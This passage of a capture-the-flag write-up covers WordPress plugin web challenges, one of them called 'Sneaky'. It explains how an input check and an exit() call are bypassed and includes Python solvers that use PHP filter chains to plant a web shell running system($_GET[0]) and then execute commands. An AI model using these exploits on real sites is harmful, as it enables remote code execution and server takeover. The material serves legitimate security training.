        if(strlen($name) > 105){
            echo "blocked.";
            exit();
        }
        
        $write = <<<EOF
            <?php
                exit('ha?');
                // $content

        EOF;

        file_put_contents($name . '.php', $write);
        return rest_ensure_response( "success" );
    }
    ```

To get RCE (Remote Code Execution), there are two things in the plugin we need to bypass. The first is the `$some_value` checker here:

```php
    $some_value = trim( strtolower( $request['somevalue'] ) );
    if( empty( $some_value ) ) {
       return false;
    }
 
    if( ! preg_match( '/^secretword_/i', $some_value) ) {
       return false;
    }
 
    if( $some_value == 'secretword_is_true' ) {
       return false;
    }
    return true;
    ...snip...
    $body = $request->get_json_params();
    $content = $body['content'];
    $name = $body['name'];
    $some_value = trim( strtolower( $request['somevalue'] ) );
    if(!get_option($some_value)){
        echo "blocked";
        exit(); 
    }

```

The second is the PHP `exit` here:

```php
    $write = <<<EOF
        <?php
            exit('ha?');
            // $content

    EOF;

    file_put_contents($name . '.php', $write);
    return rest_ensure_response( "success" );
```

For the first bypass, we can use the fact that parameters in the URL (`'/upload/(?P<somevalue>\w+)'`) can be passed via URL parameters, JSON, or the request body. Interestingly, it will match not only by its regex `\w+` but will match all its values. This behavior might be due to the plugin getting the `somevalue` by using an array (`$request['somevalue']`), which will get the value from URL parameters, JSON, or the request body. So, we just need to pass something like `\x01` in the `somevalue`, and it will bypass all the checks.

For the second bypass, we can use a PHP filter because we can directly influence the start of `file_put_contents` using `$name`. In this case, we will use UTF-8 to UTF-16BE, as shown in the solution below.

## Solver

```python
import httpx
import asyncio
URL = "http://52.77.81.199:9199/"
class BaseAPI:
    def __init__(self, url=URL) -> None:
        self.c = httpx.AsyncClient(base_url=url)

class API(BaseAPI):
    async def upload_something(self, content: str, name: str) -> None:
        data = {
            "content": content,
            "name": name
        }
        return await self.c.post("/wp-json/test/upload/x", params={"somevalue": "secretword_is_true\x01"}, json=data)
    def get_shell(self, cmd):
        return self.c.get("/wp-content/uploads/x.php", params={"0": cmd})
async def main():
    api = API()
    res = await api.upload_something(
        content=b" <?php system($_GET[0]);?>".decode('utf-16-be'),
        name="php://filter/convert.iconv.UTF8.UTF-16BE/resource=/var/www/html/wp-content/uploads/x"
    )
    res = await api.get_shell("cat /*")
    print(res.text)

if __name__ == "__main__":
    asyncio.run(main())
 
```

### Flag

![](./imgs/image_dxH47Wup.png)

# **Sneaky**

| Solves | 5 |
| ------ | - |

Description

    You sneaky ...

    NOTE: This is a fully white box challenge, almost no heavy brute force is needed.

Attachments

    [image](https://prod-files-secure.s3.us-west-2.amazonaws.com/39d1be85-e7c6-4263-a666-a42da95a70df/c534e31b-0795-4183-a2e6-22588ecc2676/attachment.zip?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=ASIAZI2LB466XBHYJBN3%2F20250523%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250523T141413Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEDYaCXVzLXdlc3QtMiJHMEUCIQCxBy4mRU9koiMdw7EHI%2FltBX8ujaWtfQjxrQXdLoVcqAIgEv0t4SxaORRDUNMRhDq8fA%2FUawAJ0SUN2%2FHQCK1XjOgqiAQI7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARAAGgw2Mzc0MjMxODM4MDUiDFTyTPMT8iX4w8QGjyrcA39QIgrJNTIHZJro13l82DOPo70o%2FhuaDR9Ea5C%2FIaquOag4vyAfv10bxbZDevvyX1MvNHj%2F3%2Bez8KSoPixwbT8F3X2SPgQ78GX4J0LhO%2Bw0PCQUBkVtulw%2FvEmVLxNN1C5NknAICXji9fYfcN0udNuNdNOWn18iZBRmJU5Ut%2FRcGSghDoxcgTCXbJy56nvpCQWu%2BVJ33DlUsFhfR2sOaNZPXT7d7miRl1HX6xVbCfUSffpxYfWZDrx9OTiio2ZGrLBOtW6Rokqea5gulTzHHKugMCy2wvUCpbpogjWFsYvujoEAPOM8ghFLwjH4%2F3uEgYVrS8ePwBSdqlLaVHSEoJQesEyddA7GqSnqeFtOxoG1wY6QFpVQzj3oE2q%2BKKC9iABxuDk51%2FXSpKjFWo2YLPkjBnYeFnd8hhciBWHLl%2FSILvfEmwTUXlXAxZmYvi%2FE8gvT4WuP269%2Fr%2BC%2Bx1UMI%2FF6wFiSdovHpeCmBHTnQt98MimKErFq1oHhEjdQGwMp8ZHV0ukYw6lZKv80wUUmKazyF%2BODCzhLVbZYhc%2Brc2e1f6yKJ0gqAIuT1xhzTZBXT20nnYhMOqEzkd1QiByiqlKxJMuh5KYdUgC3gKqr9%2Bd9%2FnRsiR64%2FDu52czSMNvxwcEGOqUBywAj0PVaqkXv1FgmYaFN1UJOcq5GlCQm2nUa9ObHiO2yg7ZSSDAfVojWTFRntFTVrfvVPSxhRYIbyrkZTuSCJJJBgK8Sb1zuQVnOnTN0nhwfdFhrWdYevyph4fUS98Ax7qGX50hfby6CDfDFHubFkrdGo%2BZfUM0OlHJJE%2FhfN25SGGVNJg05fVe27eCM1mV1lmxAbKhO1g%2BIleqkLl%2B1HNwwY%2FLQ&X-Amz-Signature=f073e27bb2363ddf3cd8df33d7c714fbc5a93506d2a2486671ee52ec865ab4c0&X-Amz-SignedHeaders=host&x-id=GetObject)

References

    - [https://github.com/synacktiv/php_filter_chain_generator](https://github.com/synacktiv/php_filter_chain_generator)

***

In this challenge, we will exploit a PHP filter chain in the `imagepng($image, $filename)` function, where the `$filename` is a variable that we can fully control.

When we look at the source code in `server-given/docker/wordpress/toolbox/plugins/mwb-point-of-sale-pos-for-woocommerce/package/lib/php-barcode-master/barcode.php`, we can see the following:

barcode.php

    ```php
    <?php
    /**
     *  Author  David S. Tufts
     *  Company davidscotttufts.com
     *
     *  Date:   05/25/2003
     *  Usage:  <img src="/barcode.php?text=testing" alt="testing" />
     *
     *  @package    Ultimate_Woocommerce_Gift_Card
     */

    /*
     For demonstration purposes, get pararameters that are passed in through $_GET or set to the default value. */
     $filepath = isset( $_GET['filepath'] ) ? $_GET['filepath']  : '';
     $text = isset( $_GET['text'] ) ? $_GET['text']  : '0';
     $size = isset( $_GET['size'] ) ? $_GET['size']  : '20';
     $orientation = isset( $_GET['orientation'] ) ? $_GET['orientation']  : 'horizontal';
     $code_type = isset( $_GET['codetype'] ) ? $_GET['codetype']  : 'code128';
     $print = isset( $_GET['print'] ) && ( 'true' == $_GET['print'] )  ? true : false;
     $sizefactor = isset( $_GET['sizefactor'] ) ? $_GET['sizefactor'] : '1';

    barcode( $filepath, $text, $size , $orientation , $code_type , $print , $sizefactor );
    /**
     * This function call can be copied into your project and can be made from anywhere in your code.
     *
     * @param string  $filepath Filepath.
     * @param string  $text Text.
     * @param string  $size Size.
     * @param string  $orientation Orientation.
     * @param string  $code_type Code Type.
     * @param boolean $print Print.
     * @param integer $size_factor Size factor.
     * @return void
     */
    function barcode( $filepath = '', $text = '0', $size = '20', $orientation = 'horizontal', $code_type = 'code128', $print = false, $size_factor = 1 ) {
    	$code_string = '';
    	// Translate the $text into barcode the correct $code_type.
    	if ( in_array( strtolower( $code_type ), array( 'code128', 'code128b' ) ) ) {
    		$chksum = 104;
    		// Must not change order of array elements as the checksum depends on the array's key to validate final code.
    		$code_array = array(
    			' ' => '212222',
    			'!' => '222122',
    			'"' => '222221',
    			'#' => '121223',
    			'$' => '121322',
    			'%' => '131222',
    			'&' => '122213',
    			"'" => '122312',
    			'(' => '132212',
    			')' => '221213',
    			'*' => '221312',
    			'+' => '231212',
    			',' => '112232',
    			'-' => '122132',
    			'.' => '122231',
    			'/' => '113222',
    			'0' => '123122',
    			'1' => '123221',
    			'2' => '223211',
    			'3' => '221132',
    			'4' => '221231',
    			'5' => '213212',
    			'6' => '223112',
    			'7' => '312131',
    			'8' => '311222',
    			'9' => '321122',
    			':' => '321221',
    			';' => '312212',
    			'<' => '322112',
    			'=' => '322211',
    			'>' => '212123',
    			'?' => '212321',
    			'@' => '232121',
    			'A' => '111323',
    			'B' => '131123',
    			'C' => '131321',
    			'D' => '112313',
    			'E' => '132113',
    			'F' => '132311',
    			'G' => '211313',
    			'H' => '231113',
    			'I' => '231311',
    			'J' => '112133',
    			'K' => '112331',
    			'L' => '132131',
    			'M' => '113123',
    			'N' => '113321',
    			'O' => '133121',
    			'P' => '313121',
    			'Q' => '211331',
    			'R' => '231131',
    			'S' => '213113',
    			'T' => '213311',
    			'U' => '213131',
    			'V' => '311123',
    			'W' => '311321',
    			'X' => '331121',
    			'Y' => '312113',
    			'Z' => '312311',
    			'[' => '332111',
    			'\\' => '314111',
    			']' => '221411',
    			'^' => '431111',
    			'_' => '111224',
    			'\`' => '111422',
    			'a' => '121124',
    			'b' => '121421',
    			'c' => '141122',
    			'd' => '141221',
    			'e' => '112214',
    			'f' => '112412',
    			'g' => '122114',
    			'h' => '122411',
    			'i' => '142112',
    			'j' => '142211',
    			'k' => '241211',
    			'l' => '221114',
    			'm' => '413111',
    			'n' => '241112',
    			'o' => '134111',
    			'p' => '111242',
    			'q' => '121142',
    			'r' => '121241',
    			's' => '114212',
    			't' => '124112',
    			'u' => '124211',
    			'v' => '411212',
    			'w' => '421112',
    			'x' => '421211',
    			'y' => '212141',
    			'z' => '214121',
    			'{' => '412121',
    			'|' => '111143',
    			'}' => '111341',
    			'~' => '131141',
    			'DEL' => '114113',
    			'FNC 3' => '114311',
    			'FNC 2' => '411113',
    			'SHIFT' => '411311',
    			'CODE C' => '113141',
    			'FNC 4' => '114131',
    			'CODE A' => '311141',
    			'FNC 1' => '411131',
    			'Start A' => '211412',
    			'Start B' => '211214',
    			'Start C' => '211232',
    			'Stop' => '2331112',
    		);
    		$code_keys = array_keys( $code_array );
    		$code_values = array_flip( $code_keys );
    		$text_length = strlen( $text );
    		for ( $x = 1; $x <= $text_length; $x++ ) {
    			$active_key = substr( $text, ( $x - 1 ), 1 );
    			$code_string .= $code_array[ $active_key ];
    			$chksum = ( $chksum + ( $code_values[ $active_key ] * $x ) );
    		}
    		$code_string .= $code_array[ $code_keys[ ( $chksum - ( intval( $chksum / 103 ) * 103 ) ) ] ];

    		$code_string = '211214' . $code_string . '2331112';
    	} elseif ( 'code128a' == strtolower( $code_type ) ) {
    		$chksum = 103;
    		$text = strtoupper( $text ); // Code 128A doesn't support lower case.
    		// Must not change order of array elements as the checksum depends on the array's key to validate final code.
    		$code_array = array(
    			' ' => '212222',
    			'!' => '222122',
    			'"' => '222221',
    			'#' => '121223',
    			'$' => '121322',
    			'%' => '131222',
    			'&' => '122213',
    			"'" => '122312',
    			'(' => '132212',
    			')' => '221213',
    			'*' => '221312',
    			'+' => '231212',
    			',' => '112232',
    			'-' => '122132',
    			'.' => '122231',
    			'/' => '113222',
    			'0' => '123122',
    			'1' => '123221',
    			'2' => '223211',
    			'3' => '221132',
    			'4' => '221231',
    			'5' => '213212',
    			'6' => '223112',
    			'7' => '312131',
    			'8' => '311222',
    			'9' => '321122',
    			':' => '321221',
    			';' => '312212',
    			'<' => '322112',
    			'=' => '322211',
    			'>' => '212123',
    			'?' => '212321',
    			'@' => '232121',
    			'A' => '111323',
    			'B' => '131123',
    			'C' => '131321',
    			'D' => '112313',
    			'E' => '132113',
    			'F' => '132311',
    			'G' => '211313',
    			'H' => '231113',
    			'I' => '231311',
    			'J' => '112133',
    			'K' => '112331',
    			'L' => '132131',
    			'M' => '113123',
    			'N' => '113321',
    			'O' => '133121',
    			'P' => '313121',
    			'Q' => '211331',
    			'R' => '231131',
    			'S' => '213113',
    			'T' => '213311',
    			'U' => '213131',
    			'V' => '311123',
    			'W' => '311321',
    			'X' => '331121',
    			'Y' => '312113',
    			'Z' => '312311',
    			'[' => '332111',
    			'\\' => '314111',
    			']' => '221411',
    			'^' => '431111',
    			'_' => '111224',
    			'NUL' => '111422',
    			'SOH' => '121124',
    			'STX' => '121421',
    			'ETX' => '141122',
    			'EOT' => '141221',
    			'ENQ' => '112214',
    			'ACK' => '112412',
    			'BEL' => '122114',
    			'BS' => '122411',
    			'HT' => '142112',
    			'LF' => '142211',
    			'VT' => '241211',
    			'FF' => '221114',
    			'CR' => '413111',
    			'SO' => '241112',
    			'SI' => '134111',
    			'DLE' => '111242',
    			'DC1' => '121142',
    			'DC2' => '121241',
    			'DC3' => '114212',
    			'DC4' => '124112',
    			'NAK' => '124211',
    			'SYN' => '411212',
    			'ETB' => '421112',
    			'CAN' => '421211',
    			'EM' => '212141',
    			'SUB' => '214121',
    			'ESC' => '412121',
    			'FS' => '111143',
    			'GS' => '111341',
    			'RS' => '131141',
    			'US' => '114113',
    			'FNC 3' => '114311',
    			'FNC 2' => '411113',
    			'SHIFT' => '411311',
    			'CODE C' => '113141',
    			'CODE B' => '114131',
    			'FNC 4' => '311141',
    			'FNC 1' => '411131',
    			'Start A' => '211412',
    			'Start B' => '211214',
    			'Start C' => '211232',
    			'Stop' => '2331112',
    		);
    		$code_keys = array_keys( $code_array );
    		$code_values = array_flip( $code_keys );
    		$text_length = strlen( $text );
    		for ( $x = 1; $x <= $text_length; $x++ ) {
    			$active_key = substr( $text, ( $x - 1 ), 1 );
    			$code_string .= $code_array[ $active_key ];
    			$chksum = ( $chksum + ( $code_values[ $active_key ] * $x ) );
    		}
    		$code_string .= $code_array[ $code_keys[ ( $chksum - ( intval( $chksum / 103 ) * 103 ) ) ] ];

    		$code_string = '211412' . $code_string . '2331112';
    	} elseif ( strtolower( $code_type ) == 'code39' ) {
    		$code_array = array(
    			'0' => '111221211',
    			'1' => '211211112',
    			'2' => '112211112',
    			'3' => '212211111',
    			'4' => '111221112',
    			'5' => '211221111',
    			'6' => '112221111',
    			'7' => '111211212',
    			'8' => '211211211',
    			'9' => '112211211',
    			'A' => '211112112',
    			'B' => '112112112',
    			'C' => '212112111',
    			'D' => '111122112',
    			'E' => '211122111',
    			'F' => '112122111',
    			'G' => '111112212',
    			'H' => '211112211',
    			'I' => '112112211',
    			'J' => '111122211',
    			'K' => '211111122',
    			'L' => '112111122',
    			'M' => '212111121',
    			'N' => '111121122',
    			'O' => '211121121',
    			'P' => '112121121',
    			'Q' => '111111222',
    			'R' => '211111221',
    			'S' => '112111221',
    			'T' => '111121221',
    			'U' => '221111112',
    			'V' => '122111112',
    			'W' => '222111111',
    			'X' => '121121112',
    			'Y' => '221121111',
    			'Z' => '122121111',
    			'-' => '121111212',
    			'.' => '221111211',
    			' ' => '122111211',
    			'$' => '121212111',
    			'/' => '121211121',
    			'+' => '121112121',
    			'%' => '111212121',
    			'*' => '121121211',
    		);

    		// Convert to uppercase.
    		$upper_text = strtoupper( $text );

    		$upper_text_length = strlen( $upper_text );
    		for ( $x = 1; $x <= $upper_text_length; $x++ ) {
    			$code_string .= $code_array[ substr( $upper_text, ( $x - 1 ), 1 ) ] . '1';
    		}

    		$code_string = '1211212111' . $code_string . '121121211';
    	} elseif ( strtolower( $code_type ) == 'code25' ) {
    		$code_array1 = array( '1', '2', '3', '4', '5', '6', '7', '8', '9', '0' );
    		$code_array2 = array( '3-1-1-1-3', '1-3-1-1-3', '3-3-1-1-1', '1-1-3-1-3', '3-1-3-1-1', '1-3-3-1-1', '1-1-1-3-3', '3-1-1-3-1', '1-3-1-3-1', '1-1-3-3-1' );

    		$text_length = strlen( $text );
    		$count_array1 = count( $code_array1 );
    		for ( $x = 1; $x <= $text_length; $x++ ) {
    			for ( $y = 0; $y < $count_array1; $y++ ) {
    				if ( substr( $text, ( $x - 1 ), 1 ) == $code_array1[ $y ] ) {
    					$temp[ $x ] = $code_array2[ $y ];
    				}
    			}
    		}

    		$text_length = strlen( $text );
    		for ( $x = 1; $x <= $text_length; $x += 2 ) {
    			if ( isset( $temp[ $x ] ) && isset( $temp[ ( $x + 1 ) ] ) ) {
    				$count_temp1 = count( $temp1 );
    				$temp1 = explode( '-', $temp[ $x ] );
    				$temp2 = explode( '-', $temp[ ( $x + 1 ) ] );
    				for ( $y = 0; $y < $count_temp1; $y++ ) {
    					$code_string .= $temp1[ $y ] . $temp2[ $y ];
    				}
    			}
    		}

    		$code_string = '1111' . $code_string . '311';
    	} elseif ( strtolower( $code_type ) == 'codabar' ) {
    		$code_array1 = array( '1', '2', '3', '4', '5', '6', '7', '8', '9', '0', '-', '$', ':', '/', '.', '+', 'A', 'B', 'C', 'D' );
    		$code_array2 = array( '1111221', '1112112', '2211111', '1121121', '2111121', '1211112', '1211211', '1221111', '2112111', '1111122', '1112211', '1122111', '2111212', '2121112', '2121211', '1121212', '1122121', '1212112', '1112122', '1112221' );

    		// Convert to uppercase.
    		$upper_text = strtoupper( $text );
    		$upper_text_length = strlen( $upper_text );
    		for ( $x = 1; $x <= $upper_text_length; $x++ ) {
    			$count_array1 = count( $code_array1 );
    			for ( $y = 0; $y < $count_array1; $y++ ) {
    				if ( substr( $upper_text, ( $x - 1 ), 1 ) == $code_array1[ $y ] ) {
    					$code_string .= $code_array2[ $y ] . '1';
    				}
    			}
    		}
    		$code_string = '11221211' . $code_string . '1122121';
    	}

    	// Pad the edges of the barcode.
    	$code_length = 20;
    	if ( $print ) {
    		$text_height = 30;
    	} else {
    		$text_height = 0;
    	}

    	$code_string_length = strlen( $code_string );
    	for ( $i = 1; $i <= $code_string_length; $i++ ) {
    		$code_length = $code_length + (int) ( substr( $code_string, ( $i - 1 ), 1 ) );
    	}

    	if ( 'horizontal' == strtolower( $orientation ) ) {
    		$img_width = $code_length * $size_factor;
    		$img_height = $size;
    	} else {
    		$img_width = $size;
    		$img_height = $code_length * $size_factor;
    	}

    	$image = imagecreate( $img_width, $img_height + $text_height );
    	$black = imagecolorallocate( $image, 0, 0, 0 );
    	$white = imagecolorallocate( $image, 255, 255, 255 );

    	imagefill( $image, 0, 0, $white );
    	var_dump($print);
    	if ( $print ) {
    		imagestring( $image, 5, 31, $img_height, $text, $black );
    	}

    	$location = 10;
    	$code_string_length = strlen( $code_string );
    	for ( $position = 1; $position <= $code_string_length; $position++ ) {
    		$cur_size = $location + ( substr( $code_string, ( $position - 1 ), 1 ) );
    		if ( 'horizontal' == strtolower( $orientation ) ) {
    			imagefilledrectangle( $image, $location * $size_factor, 0, $cur_size * $size_factor, $img_height, ( 0 == $position % 2 ? $white : $black ) );
    		} else {
    			imagefilledrectangle( $image, 0, $location * $size_factor, $img_width, $cur_size * $size_factor, ( 0 == $position % 2 ? $white : $black ) );
    		}
    		$location = $cur_size;
    	}

    	// Draw barcode to the screen or save in a file.
    	if ( '' == $filepath ) {
    		header( 'Content-type: image/png' );
    		imagepng( $image );
    		imagedestroy( $image );
    	} else {
    		imagepng( $image, $filepath );
    		imagedestroy( $image );
    	}
    }

    ```

We can see that it uses a function named `barcode`, which in the end will save the file using the `imagepng` function. The file will be saved to our user-inputted variable named `$filename`. We can inject this `$filename` using a PHP filter chain to control its output. I use these tools to generate the filters:

> [![favicon](./imgs/favicon_f8fO6Cee.svg) **GitHub**](https://github.com/synacktiv/php_filter_chain_generator)\
> Contribute to synacktiv/php\_filter\_chain\_generator development by creating an account on GitHub.\
> <https://github.com/synacktiv/php_filter_chain_generator>

## Solver

solver.py

    ```python
    import httpx
    import asyncio

    URL = "http://52.77.81.199:9108/"
    class BaseAPI:
        def __init__(self, url=URL) -> None:
            self.c = httpx.AsyncClient(base_url=url)

        def qrcode(self, filepath: str = '', text: str = '0', size: str = '20', 
                   orientation: str = 'horizontal', code_type: str = 'code128', 
                   print_option: bool = False, sizefactor: str = '1') -> None:
            return self.c.get("/wp-content/plugins/mwb-point-of-sale-pos-for-woocommerce/package/lib/php-barcode-master/barcode.php", params={
                "filepath": filepath,
                "text": text,
                "size": size,
                "orientation": orientation,
                "codetype": code_type,
                "print": 'true' if print_option else 'false',
                "sizefactor": sizefactor
            })

    class API(BaseAPI):
        def shell(self, cmd):
            return self.c.get("/wp-content/uploads/koko-analytics/sss.php", params={"0": cmd})

    async def main():
        api = API()
        # python3 filter.py --chain "<?php system(\$_GET[0]);?>"
        x = "php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.iconv.UCS2.UTF-8|convert.iconv.CSISOLATIN6.UCS-4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.CSA_T500.L4|convert.iconv.ISO_8859-2.ISO-IR-103|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.863.UTF-16|convert.iconv.ISO6937.UTF16LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.BIG5|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.865.UTF16|convert.iconv.CP901.ISO6937|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.8859_3.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.863.UTF-16|convert.iconv.ISO6937.UTF16LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.864.UTF32|convert.iconv.IBM912.NAPLPS|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.BIG5|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.865.UTF16|convert.iconv.CP901.ISO6937|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS|convert.iconv.MSCP1361.UTF-32LE|convert.iconv.IBM932.UCS-2BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.ISO6937.8859_4|convert.iconv.IBM868.UTF-16LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L4.UTF32|convert.iconv.CP1250.UCS-2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF16|convert.iconv.ISO6937.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF32|convert.iconv.L6.UCS-2|convert.iconv.UTF-16LE.T.61-8BIT|convert.iconv.865.UCS-4LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.MAC.UTF16|convert.iconv.L8.UTF16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSIBM1161.UNICODE|convert.iconv.ISO-IR-156.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=/var/www/html/wp-content/uploads/koko-analytics/sss.php"
        res = await api.qrcode(x, "xxx", print_option=False, code_type="code128a", size=1)
        res = await api.shell("cat /*")
        print(res.text)

    if __name__ == "__main__":
        asyncio.run(main())

    ```

### Flag

![](./imgs/image_gKss6j1t.png)

## Explanation

# **Up To You**

| Solves | 3 |
| ------ | - |

Description

    it's all up to you.

    NOTE: This is a fully white box challenge, almost no heavy brute force is needed.

Attachments

    [image](https://prod-files-secure.s3.us-west-2.amazonaws.com/39d1be85-e7c6-4263-a666-a42da95a70df/4c454296-d8a6-4eb2-abcc-0e74b46c41cc/attachment.zip?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=ASIAZI2LB466ZXYHZMXE%2F20250523%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250523T141421Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEDYaCXVzLXdlc3QtMiJGMEQCIGpbYZIOLaCYiGiDUYNnYNRfKeHnVe0FBFV6h%2BQ7OjRIAiAUKeC7GO85uqgfDfh2H81DpyULoc2ksVgXmkcHuzkgbSqIBAjv%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F8BEAAaDDYzNzQyMzE4MzgwNSIMd4TkuQjy2QsOTNGVKtwDMDBFGI7mFUKTlj4p2uUClQECqxFoM3oIRVrl%2FpN2EAR0b5DdDOukaaOYvlxB2RcvyZAJQ8B7QixnrRNv%2FHUgjtc6GnxraCmZtVYBu7eqMl8JKBLCXOdMN9LJPnXoGuHkaj6cDPPvZgtVtfxXywPvKvPGwjY69LbZC0elaBO%2FgaYkirfTXjToqHo%2BzhGrz4slNMS%2BsbRJKzm9RpS%2FtqwHuQhqu3r4QBfplb4UcDCDGb06ATaFiEkMrStnitLHfrXsjEv4ElRhicdzl2NFCVthpK05ddlgTzUPt%2FpIACBv1mw1QGK91Q4Zkbi8V2kwvKBi9uHSgRmQ7XyA0HADqqPDmOHrpMllaO6l%2Fubi6HhV2goDgoESBXCviK1fr0jeSHOOpYaqTKCi6SLCBS3nkBssfAF%2BX9YlctD2O%2FcsXDqAncyDm3rxXcGzpbAXKIPp2muVYiiuOFc9O%2FOc9Xp35%2F4vAXsZrTfDyrgZygLuTUpyilsZR3XurXNNlgGGY4BAT9X8hi20CgkcEsOvRNuwk3K%2FWMPcQqRY6M%2BRoT4Ry9YaVd2Ki9bYfJ8aevA%2BiJZLQo%2Bz4HOzaOpDPLLbH1poJUbUqnB8aT%2B8ICNkEwPh%2FpsEgKzXUX9cbTFAbVMN74Qw3PHBwQY6pgFNc9O3NGXE015xdcSEai6ZMOtF9u9okUFSSQtPQldeki7JhWDDyV%2FNPlNeX%2FoDuymasENfMXh4WWIHnAwda4M4Gu0KP1F4GxwsFcHLkX7vbJhdOdsP2MILP8y9j2LNvn2wZtl91bjITzPuaAGJcwRtNN8zV6yFioLgFBkSeXbZ8zvnqryjdp4YS4FUWRKLxR99eE9ZZ2xA%2BIo96tPcNSr0%2F2kYwUAp&X-Amz-Signature=db4c13739558cf799ed47966982134f8a12aaad2c98c0acbba299f4bff1bfb7e&X-Amz-SignedHeaders=host&x-id=GetObject)

References

***

In this challenge, we will exploit two vulnerabilities. The first one is a WordPress option update vulnerability, and the second one is an IDOR vulnerability.

For the first vulnerability, we can easily identify it by reading the plugin source code here:

test-plugin.php

    ```php
    add_action("wp_ajax_nopriv_uptoyou", "uptoyou");

    function uptoyou(){
        $option_name = $_POST["option_name"];
